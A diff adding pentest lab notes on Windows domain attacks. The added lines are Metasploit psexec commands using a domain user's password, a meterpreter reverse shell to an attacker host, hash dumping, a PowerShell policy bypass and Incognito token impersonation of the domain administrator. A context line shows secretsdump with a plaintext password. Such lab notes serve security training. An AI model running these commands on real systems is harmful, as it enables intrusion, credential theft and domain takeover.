@@ -56,9 +56,34 @@ $ secretdump.py SNEAKS.local/Administrator:'Passw0rd1@'@10.0.0.225
 
 
 
+-- Token Impersonation with Incognito --
 
+msf > use exploit/windows/smb/psexec
+msf exploit(/windows/smb/psexec) > options
+msf exploit(/windows/smb/psexec) > RHOST 10.211.55.140
+msf exploit(/windows/smb/psexec) > set smbdomain marvel.local
+msf exploit(/windows/smb/psexec) > set smbpass Password1
+msf exploit(/windows/smb/psexec) > set smbuser fcastle
+msf exploit(/windows/smb/psexec) > show targets
+msf exploit(/windows/smb/psexec) > set target 2
+msf exploit(/windows/smb/psexec) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf exploit(/windows/smb/psexec) > set LHOST 10.211.55.162
+msf exploit(/windows/smb/psexec) > exploit
 
+meterpreter > hashdump
+meterpreter > getuid
+meterpreter > sysinfo
 
+meterpreter > shell
+C:\Windows > powershell -ep bypass
+
+meterpreter > load <Double Tabulator>
+meterpreter > load incognito
+meterpreter > list_tokens -u
+meterpreter > impersonate_token marvel\\administrator
+meterpreter > shell
+meterpreter > whoami
+meterpreter > rev2self
 
 
 
